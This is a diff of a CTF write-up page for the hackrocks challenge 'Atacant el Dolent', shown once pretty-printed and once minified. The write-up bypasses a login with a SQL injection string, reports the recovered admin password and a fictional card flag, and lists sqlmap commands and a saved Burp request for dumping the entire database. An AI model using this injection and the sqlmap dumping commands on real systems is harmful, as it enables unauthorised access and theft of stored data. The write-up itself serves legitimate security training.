@@ -1,181 +1,20 @@
-<!DOCTYPE html>
-<html lang="en">
-
-    <head><title>🤖 [0x01] Atacant el Dolent &ndash; ~/cake</title>
-
-
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<meta charset="utf-8"/>
-
-
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
-
-
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/devicon/2.15.1/devicon.min.css" integrity="sha512-X2hbziex+UPQ+KdI4BWI+39jEDhf2Smc6bfFI/FTIzWnt7mbwZCUU4RWalnMfxtHCpISlexzmd2kvPFJCliiPA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
-
-<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
-<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
-<link rel="manifest" href="/site.webmanifest">
-
-
-<link rel="stylesheet" href="https://cakehonolulu.github.io/css/colour/gruvbox-dark.css">
-<link rel="stylesheet" href="https://cakehonolulu.github.io/css/colour/dark-mode.css">
-<link rel="stylesheet" href="https://cakehonolulu.github.io/css/risotto.css">
-<link rel="stylesheet" href="https://cakehonolulu.github.io/css/custom.css">
-</head>
-
-    <body>
-        <div class="page">
-
-            <header class="page__header"><h1 class="page__logo"><a href="https://cakehonolulu.github.io" class="page__logo-inner">~/cake</a></h1>
-<nav class="page__nav main-nav">
-    <ul>
-    
-    
-    <li class="main-nav__item"><a class="nav-main-item" href="/about/" title="">About</a></li>
-    
-    <li class="main-nav__item"><a class="nav-main-item active" href="/ctfs/" title="writeups">writeups</a></li>
-    
-    </ul>
-</nav>
-
-</header>
-
-            <section class="page__body">
-    <header class="content__header">
-        <h1>🤖 [0x01] Atacant el Dolent</h1>
-    </header>
-    <div class="content__body">
-        <br>
-<p><img src="/images/ctfs/nuclio_cyberhack/atacant-el-dolent/atacant-el-dolent.jpg" alt="Atacant el Dolent"></p>
-<table>
-<thead>
-  <tr>
-    <th>Difficulty</th>
-    <td>Medium</td>
-  </tr>
-</thead>
-<tbody>
-  <tr>
-    <th>Points</th>
-    <td>70</td>
-  </tr>
-  <tr>
-    <th>Category</th>
-    <td>Software security</td>
-  </tr>
-</tbody>
-</table>
-<h1 id="description">Description</h1>
-<br>
-<img src="https://emojipedia-us.s3.dualstack.us-west-1.amazonaws.com/thumbs/160/openmoji/292/flag-for-catalonia-esct_1f3f4-e0065-e0073-e0063-e0074-e007f.png" width="20px" height="20px" style="vertical-align: bottom;"> En els darrers dies s'han rebut tiquets dels nostres clients notificant i reclamant diners per compres que no han fet.
-<p>Tots ells accepten que aquests càrrecs es fan després d&rsquo;haver realitzat una compra a la nostra botiga col·laboradora.</p>
-<p>Després d&rsquo;aquest estrany incident, truquem al nostre Equip Blau per investigar el cas. Després de revisar tant els registres com el codi web, van aconseguir trobar una biblioteca de tercers que va capturar la informació de les targetes bancàries, així com el seu CVV i data de venciment.</p>
-<p>Addicionalment, analitzant aquesta biblioteca troben el lloc web on s&rsquo;enviaven les dades, però troben un login i aquest equip no està especialitzat en atacs d&rsquo;aquest estil, per la qual cosa sol·liciten la teva ajuda, perquè investiguis aquest lloc web, obtinguis accés i verificar si les dades emmagatzemades són allà, i més específicament, les dades d&rsquo;Adrián Peréz Ríos, ja que és un client important.</p>
-<hr>
-<p>El token del joc serà: contrasenyaadmin-numtargeta-cvv-datacaducitat d&rsquo;Adrián Pérez Ríos ó 0000000000-123-12/22 en cas de que no estigui.</p>
-<p>Exemple de resposta: admin12-4548812049400004-203-08/27</p>
-<p>Per accedir al repte, fes clic al següent link: <a href="https://challenges.hackrocks.com/bad-guy">https://challenges.hackrocks.com/bad-guy</a>
-<br>
-<br>
-🇺🇸 We&rsquo;ve been bombarded by our clients regarding credit card uses that were not made by them.</p>
-<p>All of them agree that those uses were done right after buying through one of our partner&rsquo;s shops.</p>
-<p>After the incident, our Blue Team started to study the infraestructure of the website and found a third-party library that was capturing our clients credit card details.</p>
-<p>Additionally, the Blue Team found a website that contains a login form; but they&rsquo;re not talented enough to gain access so they come asking for your help.
-Carefully check if there&rsquo;s our clients CC info there and check if there&rsquo;s Adrián Pérez Ríos specifically, he&rsquo;s a very important client.</p>
-<hr>
-<p>Game token is: adminpassword-ccnumber-cvv-expirydate from Adrián Pérez Ríos or 0000000000-123-12/22 by default.</p>
-<p>Token example: admin12-4548812049400004-203-08/27</p>
-<p>To access the challenge, enter here: <a href="https://challenges.hackrocks.com/bad-guy">https://challenges.hackrocks.com/bad-guy</a>
-<br></p>
-<h1>Solution walkthrough</h1>
-<br>
-<p>We start by accessing the <a href="https://challenges.hackrocks.com/bad-guy">provided link</a> and  we&rsquo;re greeted with this:</p>
-<p><img src="/images/ctfs/nuclio_cyberhack/atacant-el-dolent/login_page.png" alt="Login Page"></p>
-<p>You can try the default creds (admin:admin&hellip; and such) but they won&rsquo;t work.</p>
-<p>The exploit itself is very easy; a simple SQL injection.</p>
-<p><code>admin&rsquo; or &lsquo;1&rsquo;=&lsquo;1</code> on the user and passwords fields and&hellip;</p>
-<p><img src="/images/ctfs/nuclio_cyberhack/atacant-el-dolent/access.png" alt="Access"></p>
-<p><em>Voilá!</em></p>
-<p>You need to click on a button with an &lsquo;?&rsquo; to view the credentials, and those are:</p>
-<p>User: <code>admin</code>
-<br>
-Password: <code>123456789987654321</code></p>
-<p>We can now access the default url and check those, we try them and we&rsquo;re met with this:</p>
-<p><img src="/images/ctfs/nuclio_cyberhack/atacant-el-dolent/solution.png" alt="Solution"></p>
-<p>Where we can see the user they asked us to look for.</p>
-<p>Flag: <code>123456789987654321-6269784865499645-879-07/25</code></p>
-<p><em>NOTE:</em></p>
-<p>I also ran an SQLMap through the login request (Saved using BURP) and dumped the entire database.</p>
-<p>Out of curiosity, there&rsquo;s another user that can enter the page:</p>
-<p>User: <code>usu</code>
-Password: <code>1234678</code></p>
-<p>Commands:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sqlmap -r request.txt -p password --level <span style="color:#ae81ff">5</span> --risk <span style="color:#ae81ff">3</span></span></span></code></pre></div>
-<p>and for dumping:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sqlmap -r request.txt -p password --level <span style="color:#ae81ff">5</span> --risk <span style="color:#ae81ff">3</span> --all</span></span></code></pre></div>
-<p>Saved request with BURP:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>GET /bad-guy/?username<span style="color:#f92672">=</span>admin&amp;password<span style="color:#f92672">=</span>admin&amp;login<span style="color:#f92672">=</span>Are+you+sure%3F HTTP/1.1
-</span></span><span style="display:flex;"><span>Host: challenges.hackrocks.com
-</span></span><span style="display:flex;"><span>Cookie: darkmode<span style="color:#f92672">=</span>true; refresh<span style="color:#f92672">=</span><span style="color:#e6db74">${</span>YOUR_COOKIE<span style="color:#e6db74">}</span>; PHPSESSID<span style="color:#f92672">=</span><span style="color:#e6db74">${</span>YOUR_PHPSESSID<span style="color:#e6db74">}</span>; access<span style="color:#f92672">=</span><span style="color:#e6db74">${</span>YOUR_ACCESS<span style="color:#e6db74">}</span>
-</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>X11; Ubuntu; Linux x86_64; rv:102.0<span style="color:#f92672">)</span> Gecko/20100101 Firefox/102.0
-</span></span><span style="display:flex;"><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style="color:#f92672">=</span>0.9,image/avif,image/webp,*/*;q<span style="color:#f92672">=</span>0.8
-</span></span><span style="display:flex;"><span>Accept-Language: en-US,en;q<span style="color:#f92672">=</span>0.5
-</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate
-</span></span><span style="display:flex;"><span>Referer: https://challenges.hackrocks.com/bad-guy/
-</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests: <span style="color:#ae81ff">1</span>
-</span></span><span style="display:flex;"><span>Sec-Fetch-Dest: document
-</span></span><span style="display:flex;"><span>Sec-Fetch-Mode: navigate
-</span></span><span style="display:flex;"><span>Sec-Fetch-Site: same-origin
-</span></span><span style="display:flex;"><span>Sec-Fetch-User: ?1
-</span></span><span style="display:flex;"><span>Dnt: <span style="color:#ae81ff">1</span>
-</span></span><span style="display:flex;"><span>Sec-Gpc: <span style="color:#ae81ff">1</span>
-</span></span><span style="display:flex;"><span>Te: trailers
-</span></span><span style="display:flex;"><span>Connection: close</span></span></code></pre></div>
-
-    </div>
-    <footer class="content__footer"></footer>
-
-            </section>
-
-            <section class="page__aside">
-                <div class="aside__about">
-
-<ul class="aside__social-links">
-    
-    <li>
-        <a href="https://github.com/cakehonolulu" rel="me" aria-label="My GitHub" title="My GitHub"><i class="fa-brands fa-github" aria-hidden="true"></i></a>&nbsp;
-    </li>
-    
-    <li>
-        <a href="https://twitter.com/cakehonolulu" rel="me" aria-label="My Twitter" title="My Twitter"><i class="fa-brands fa-twitter" aria-hidden="true"></i></a>&nbsp;
-    </li>
-    
-    <li>
-        <a href="https://www.linkedin.com/in/joel-bueno-39893a230" rel="me" aria-label="My LinkedIn" title="My LinkedIn"><i class="fa-brands fa-linkedin" aria-hidden="true"></i></a>&nbsp;
-    </li>
-    
-</ul>
-</div>
-                <hr>
-                <div class="aside__content">
-    <p>Writeup for &#39;Atacant el Dolent&#39;</p>
-    
-        <p>
-            By cakehonolulu, 
-            2022-06-14
-        </p>
-    
-
-                </div>
-            </section>
-
-            <footer class="page__footer"><p class="copyright"></p>
-<p class="advertisement">Powered by <a href="https://gohugo.io/">hugo</a> and <a href="https://github.com/joeroe/risotto">risotto</a>.</p>
-</footer>
-
-        </div>
-    </body>
-
-</html>
+<!doctype html><html lang=en><head><title>🤖 [0x01] Atacant el Dolent &ndash; ~/cake</title><meta name=viewport content="width=device-width,initial-scale=1"><meta charset=utf-8><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin=anonymous referrerpolicy=no-referrer><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/devicon/2.15.1/devicon.min.css integrity="sha512-X2hbziex+UPQ+KdI4BWI+39jEDhf2Smc6bfFI/FTIzWnt7mbwZCUU4RWalnMfxtHCpISlexzmd2kvPFJCliiPA==" crossorigin=anonymous referrerpolicy=no-referrer><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=stylesheet href=https://cakehonolulu.github.io/css/colour/gruvbox-dark.css><link rel=stylesheet href=https://cakehonolulu.github.io/css/colour/dark-mode.css><link rel=stylesheet href=https://cakehonolulu.github.io/css/risotto.css><link rel=stylesheet href=https://cakehonolulu.github.io/css/custom.css></head><body><div class=page><header class=page__header><h1 class=page__logo><a href=https://cakehonolulu.github.io class=page__logo-inner>~/cake</a></h1><nav class="page__nav main-nav"><ul><li class=main-nav__item><a class=nav-main-item href=/about/ title>About</a></li><li class=main-nav__item><a class="nav-main-item active" href=/ctfs/ title=writeups>writeups</a></li></ul></nav></header><section class=page__body><header class=content__header><h1>🤖 [0x01] Atacant el Dolent</h1></header><div class=content__body><br><p><img src=/images/ctfs/nuclio_cyberhack/atacant-el-dolent/atacant-el-dolent.jpg alt="Atacant el Dolent"></p><table><thead><tr><th>Difficulty</th><td>Medium</td></tr></thead><tbody><tr><th>Points</th><td>70</td></tr><tr><th>Category</th><td>Software security</td></tr></tbody></table><h1 id=description>Description</h1><br><img src=https://emojipedia-us.s3.dualstack.us-west-1.amazonaws.com/thumbs/160/openmoji/292/flag-for-catalonia-esct_1f3f4-e0065-e0073-e0063-e0074-e007f.png width=20px height=20px style=vertical-align:bottom> En els darrers dies s'han rebut tiquets dels nostres clients notificant i reclamant diners per compres que no han fet.<p>Tots ells accepten que aquests càrrecs es fan després d&rsquo;haver realitzat una compra a la nostra botiga col·laboradora.</p><p>Després d&rsquo;aquest estrany incident, truquem al nostre Equip Blau per investigar el cas. Després de revisar tant els registres com el codi web, van aconseguir trobar una biblioteca de tercers que va capturar la informació de les targetes bancàries, així com el seu CVV i data de venciment.</p><p>Addicionalment, analitzant aquesta biblioteca troben el lloc web on s&rsquo;enviaven les dades, però troben un login i aquest equip no està especialitzat en atacs d&rsquo;aquest estil, per la qual cosa sol·liciten la teva ajuda, perquè investiguis aquest lloc web, obtinguis accés i verificar si les dades emmagatzemades són allà, i més específicament, les dades d&rsquo;Adrián Peréz Ríos, ja que és un client important.</p><hr><p>El token del joc serà: contrasenyaadmin-numtargeta-cvv-datacaducitat d&rsquo;Adrián Pérez Ríos ó 0000000000-123-12/22 en cas de que no estigui.</p><p>Exemple de resposta: admin12-4548812049400004-203-08/27</p><p>Per accedir al repte, fes clic al següent link: <a href=https://challenges.hackrocks.com/bad-guy>https://challenges.hackrocks.com/bad-guy</a><br><br>🇺🇸 We&rsquo;ve been bombarded by our clients regarding credit card uses that were not made by them.</p><p>All of them agree that those uses were done right after buying through one of our partner&rsquo;s shops.</p><p>After the incident, our Blue Team started to study the infraestructure of the website and found a third-party library that was capturing our clients credit card details.</p><p>Additionally, the Blue Team found a website that contains a login form; but they&rsquo;re not talented enough to gain access so they come asking for your help.
+Carefully check if there&rsquo;s our clients CC info there and check if there&rsquo;s Adrián Pérez Ríos specifically, he&rsquo;s a very important client.</p><hr><p>Game token is: adminpassword-ccnumber-cvv-expirydate from Adrián Pérez Ríos or 0000000000-123-12/22 by default.</p><p>Token example: admin12-4548812049400004-203-08/27</p><p>To access the challenge, enter here: <a href=https://challenges.hackrocks.com/bad-guy>https://challenges.hackrocks.com/bad-guy</a><br></p><h1>Solution walkthrough</h1><br><p>We start by accessing the <a href=https://challenges.hackrocks.com/bad-guy>provided link</a> and we&rsquo;re greeted with this:</p><p><img src=/images/ctfs/nuclio_cyberhack/atacant-el-dolent/login_page.png alt="Login Page"></p><p>You can try the default creds (admin:admin&mldr; and such) but they won&rsquo;t work.</p><p>The exploit itself is very easy; a simple SQL injection.</p><p><code>admin&rsquo; or &lsquo;1&rsquo;=&lsquo;1</code> on the user and passwords fields and&mldr;</p><p><img src=/images/ctfs/nuclio_cyberhack/atacant-el-dolent/access.png alt=Access></p><p><em>Voilá!</em></p><p>You need to click on a button with an &lsquo;?&rsquo; to view the credentials, and those are:</p><p>User: <code>admin</code><br>Password: <code>123456789987654321</code></p><p>We can now access the default url and check those, we try them and we&rsquo;re met with this:</p><p><img src=/images/ctfs/nuclio_cyberhack/atacant-el-dolent/solution.png alt=Solution></p><p>Where we can see the user they asked us to look for.</p><p>Flag: <code>123456789987654321-6269784865499645-879-07/25</code></p><p><em>NOTE:</em></p><p>I also ran an SQLMap through the login request (Saved using BURP) and dumped the entire database.</p><p>Out of curiosity, there&rsquo;s another user that can enter the page:</p><p>User: <code>usu</code>
+Password: <code>1234678</code></p><p>Commands:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ sqlmap -r request.txt -p password --level <span style=color:#ae81ff>5</span> --risk <span style=color:#ae81ff>3</span></span></span></code></pre></div><p>and for dumping:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ sqlmap -r request.txt -p password --level <span style=color:#ae81ff>5</span> --risk <span style=color:#ae81ff>3</span> --all</span></span></code></pre></div><p>Saved request with BURP:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>GET /bad-guy/?username<span style=color:#f92672>=</span>admin&amp;password<span style=color:#f92672>=</span>admin&amp;login<span style=color:#f92672>=</span>Are+you+sure%3F HTTP/1.1
+</span></span><span style=display:flex><span>Host: challenges.hackrocks.com
+</span></span><span style=display:flex><span>Cookie: darkmode<span style=color:#f92672>=</span>true; refresh<span style=color:#f92672>=</span><span style=color:#e6db74>${</span>YOUR_COOKIE<span style=color:#e6db74>}</span>; PHPSESSID<span style=color:#f92672>=</span><span style=color:#e6db74>${</span>YOUR_PHPSESSID<span style=color:#e6db74>}</span>; access<span style=color:#f92672>=</span><span style=color:#e6db74>${</span>YOUR_ACCESS<span style=color:#e6db74>}</span>
+</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>X11; Ubuntu; Linux x86_64; rv:102.0<span style=color:#f92672>)</span> Gecko/20100101 Firefox/102.0
+</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/avif,image/webp,*/*;q<span style=color:#f92672>=</span>0.8
+</span></span><span style=display:flex><span>Accept-Language: en-US,en;q<span style=color:#f92672>=</span>0.5
+</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
+</span></span><span style=display:flex><span>Referer: https://challenges.hackrocks.com/bad-guy/
+</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>Sec-Fetch-Dest: document
+</span></span><span style=display:flex><span>Sec-Fetch-Mode: navigate
+</span></span><span style=display:flex><span>Sec-Fetch-Site: same-origin
+</span></span><span style=display:flex><span>Sec-Fetch-User: ?1
+</span></span><span style=display:flex><span>Dnt: <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>Sec-Gpc: <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>Te: trailers
+</span></span><span style=display:flex><span>Connection: close</span></span></code></pre></div></div><footer class=content__footer></footer></section><section class=page__aside><div class=aside__about><ul class=aside__social-links><li><a href=https://github.com/cakehonolulu rel=me aria-label="My GitHub" title="My GitHub"><i class="fa-brands fa-github" aria-hidden=true></i></a>&nbsp;</li><li><a href=https://twitter.com/cakehonolulu rel=me aria-label="My Twitter" title="My Twitter"><i class="fa-brands fa-twitter" aria-hidden=true></i></a>&nbsp;</li><li><a href=https://www.linkedin.com/in/joel-bueno-39893a230 rel=me aria-label="My LinkedIn" title="My LinkedIn"><i class="fa-brands fa-linkedin" aria-hidden=true></i></a>&nbsp;</li></ul></div><hr><div class=aside__content><p>Writeup for 'Atacant el Dolent'</p><p>By cakehonolulu,
+2022-06-14</p></div></section><footer class=page__footer><p class=copyright></p><p class=advertisement>Powered by <a href=https://gohugo.io/>hugo</a> and <a href=https://github.com/joeroe/risotto>risotto</a>.</p></footer></div></body></html>
